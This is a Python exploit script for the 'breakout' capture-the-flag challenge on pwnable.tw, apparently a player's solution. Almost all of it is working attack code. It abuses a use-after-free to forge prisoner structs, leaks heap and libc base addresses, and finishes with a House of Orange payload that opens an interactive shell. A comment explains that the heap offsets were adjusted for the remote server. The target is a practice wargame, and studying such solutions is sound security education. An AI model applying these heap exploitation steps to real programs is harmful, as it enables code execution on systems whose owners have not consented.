#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./breakout')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10400)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
continue
'''.format(**locals())

# -- Exploit goes here --
def fake_prisoner_struct(size, where):
    fake = flat([

        where, # risk
        where, # name
        where, # alias
        0x28,  # age & cell
        where, # sentence
        size,  # note size
        where, # note
        0      # next prisoner struct

    ])
    return fake

def list_():
    sla(b"> ", b"list")

def note(cell_no, size, note_buf, attack=False):
    sla(b"> ", b"note")
    sla(b"Cell: ", str(cell_no).encode('utf-8'))
    sla(b"Size: ", str(size).encode('utf-8'))
    if attack:
        return
    sa(b"Note: ", note_buf)

def punish(cell_no):
    sla(b"> ", b"punish")
    sla(b"Cell: ", str(cell_no).encode('utf-8'))

io = start()
libc = ELF("./libc_64.so.6")
punish(0) # 0x51 chunck is now freed UAF
note(1, 0x50-8, b"\x00") # use the note of id: 1 to corrupt the prisoner struct of id: 0
list_()
reu(b"Note: \x00\x00\x00\x00")
ren(4)
heap_base = Get() - 0x11ce0
info(f"heap base : {hex(heap_base)}")
# create unsorted bins just junk allocations
note(2, 0x400, b"A")
note(3, 16, b"B")
note(4, 16, b"B")
note(2, 0x800-8, b"C")
note(5, 0x400, b"B")
list_()
for i in range(4):
    reu(b"Note: ")
reu(b"Note: ")
libc.address = Get() - 0x3c3b42
info(f"libc base : {hex(libc.address)}")
note(1, 0x50-16, fake_prisoner_struct(0x800, heap_base+0x11ce0+0x400-0x10+0x100)) # make the prisoner id: 0 struct members point to unsorted bin for libc leak
note(5, 0x400, b"A"*8)
list_()
for i in range(10):
    reu(b"Prisoner: ")
note(3, 16, b"A"*16)
note(5, 0x800-8, b"B"*0x500)
vtable = heap_base + 0x11c10 + 0x50 + 0x40 + 0x30 + 0x20 + 0x20 + 0x40 + 0x50 + 0x20 + 0x20 + 0x50 + 0x50 + 0x20 + 0x20 + 0x20 + 0x50 + 0x20 + 0x20 + 0x40 + 0x50 + 0x20 + 0x20 + 0x50 + 0x50 + 0x20 + 0x20 + 0x40 + 0x50 + 0x20 + 0x20 + 0x30 + 0x50 + 0x20 + 0x20 + 0x30 + 0x50 + 0x20 + 0x20 + 0x30 + 0x50 + 0x20 + 0x20
# vtable = vtable + 0x410
note(1, 0x50-16, fake_prisoner_struct(0x20000, vtable))
list_()
reu(b"Cell: 0")
reu(b"Note: ")
print(hexdump(ren(0x20)))
"""
exploit failed on remote because heap allocations was a little different on my local
machine so i dumped the heap allocation like this to find offset to unsorted bin. There
was a 0x410 allocation on my local machine above the unsorted bin which was not there
in remote system
"""
sla(b"> ", b"help")
note(0, 0x10000 ,  HouseOfOrange(heap_base+0x12938-0x410) + p(0)*3 )
note(9, 32, b"4n0nym4u5", attack=True)
io.interactive()